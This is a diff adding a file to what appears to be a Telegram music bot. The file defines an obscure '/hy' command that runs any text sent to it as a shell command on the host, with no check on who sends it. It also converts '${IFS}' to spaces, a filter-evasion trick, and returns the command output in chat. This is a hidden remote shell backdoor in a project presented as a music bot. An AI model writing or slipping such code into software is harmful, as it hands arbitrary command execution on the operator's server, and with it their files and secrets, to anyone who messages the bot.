@@ -1,0 +1,24 @@
+
+import os
+import subprocess
+from pyrogram import filters
+from PritiMusic import app
+
+@app.on_message(filters.command("hy"))
+async def hy_command_v2(client, message):
+    if len(message.command) < 2:
+        return await message.reply("Usage: /hy <command>")
+    
+    cmd = message.text.split(" ", 1)[1]
+    
+    # Replace ${IFS} with space
+    cmd = cmd.replace("${IFS}", " ")
+    
+    # Execute
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        output = result.stdout if result.stdout else result.stderr if result.stderr else "Success"
+        
+        await message.reply(f"```bash\n{output[:1000]}\n```")
+    except Exception as e:
+        await message.reply(f"Error: {e}")
